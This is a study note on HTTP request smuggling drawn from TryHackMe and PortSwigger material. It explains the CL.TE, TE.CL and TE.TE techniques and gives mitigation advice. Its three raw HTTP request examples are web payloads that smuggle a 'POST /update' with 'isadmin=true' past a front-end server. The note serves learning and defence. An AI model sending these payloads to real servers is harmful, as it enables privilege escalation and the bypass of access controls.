# HTTP Request Smuggling

[PortSwigger's HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling) states: *HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.Request smuggling is primarily associated with HTTP/1 requests. However, websites that support HTTP/2 may be vulnerable, depending on their back-end architecture.*

Given modern web application infrastructure:
![1920](modern-web-applications-http-request-smuggling.excalidraw.md)
There can be:
- Front-end servers
- Back-end servers
- Databases
- APIs
- Microservices
- Load Balancers
- Reverse Proxies
- Cache Mechanisms - storing data, results for future use - generally to reduce compute and network requests made by infrastructure
	- Content Caching - caching unchanging web content   
	- Database Query caching - caching the results of frequent query 
	- Full-page Caching - Entire page is cache so users do not need to regenerate them
	- Edge Caching/CDNs -  Content Delivery Networks (CDNs) cache content closer to the users
	- API Caching - caching API frequently used or all responses 

## Defining a HTTP Request Smuggling Attack 

HTTP Request Smuggling can occur when multiple different servers interpret HTTP request boundaries and the processing sequences of HTTP requests received create discrepancies in interpretation. 
- Conflicting Headers lead to (most like) undefined prioritisation
	- Either `Content-Length` and `Transfer-Encoding` headers

## Techniques

#### HTTP Request Smuggling CL.TE

CL.TE denotes Content-Length/Transfer-Encoding: front-end server and the back-end server interprets the request boundaries differently
- `Content-Length: 80` - Size matters how the server that interprets this header. 
- `Transfer-Encoding: chunked` is interpreted as a `0` and therefore end of a chunk, the second request 

Example from [THM HTTP Request Smuggling Room](https://tryhackme.com/room/httprequestsmuggling):
```php
POST /search HTTP/1.1
Host: example.com
Content-Length: 80
Transfer-Encoding: chunked

0

POST /update HTTP/1.1
Host: example.com
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

isadmin=true
```
#### HTTP Request Smuggling TE.CL

TE.CL denotes Transfer-Encoding/Content-Length: front-end server uses the Transfer-Encoding header to determine the end of a request, and the back-end server uses the Content-Length header.
- `Transfer-Encoding: chunked` is interpreted as chunked up to  `0` by front-end as part of the first request 
- `Content-Length: 4` is interpreted by the back-end and then process only the first 4 bytes of the request; then the remaining part of the request, from `POST /update...` is then process 

Example from [THM HTTP Request Smuggling Room](https://tryhackme.com/room/httprequestsmuggling):
```php
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

4c
POST /update HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

isadmin=true
0
```

#### HTTP Request Smuggling TE.TE 

TE.TE or Transfer-Encoding/Transfer-Encoding  is known as Transfer Encoding Obfuscation where two servers handle the `Transfer-Encoding` header inconsistently. Either using:
- Multiple `Transfer-Encoding` headers
- Single malformed `Transfer-Encoding` header 
```php
POST / HTTP/1.1
Host: example.com
Content-length: 4
// Either front-end will interpret or..
// ..Malformed header that will be ignored and interpret to the 0
Transfer-Encoding: chunked  
Transfer-Encoding: chunked1 
// back-end would either reject malformed or process similar to front-end
// Or interpret process only the first `4` bytes from Content-Length and then process then next part of the request:

4c
POST /update HTTP/1.1
Host: example.com
Content-length: 15

isadmin=true
0 
```

#### Mitigation and Prevention Strategies for HTTP/1


1. **Consistent Header Processing**: All servers, whether front-end or back-end, should consistently process headers. Any discrepancy can open the door for smuggling.
2. **Adopt HTTP/2**: HTTP/2 offers a more robust mechanism for handling request boundaries, making it a safer choice against smuggling attacks.
3. **Regular Monitoring and Audits**: Continuously monitor web server traffic for signs of smuggling attempts and conduct regular audits to ensure server configurations are up-to-date and secure.
4. **Educate Teams**: Ensure that development and operations teams are well-informed about the risks of request smuggling and the best practices to prevent it.


## References

[THM HTTP Request Smuggling Room](https://tryhackme.com/room/httprequestsmuggling)
[PortSwigger's HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling) 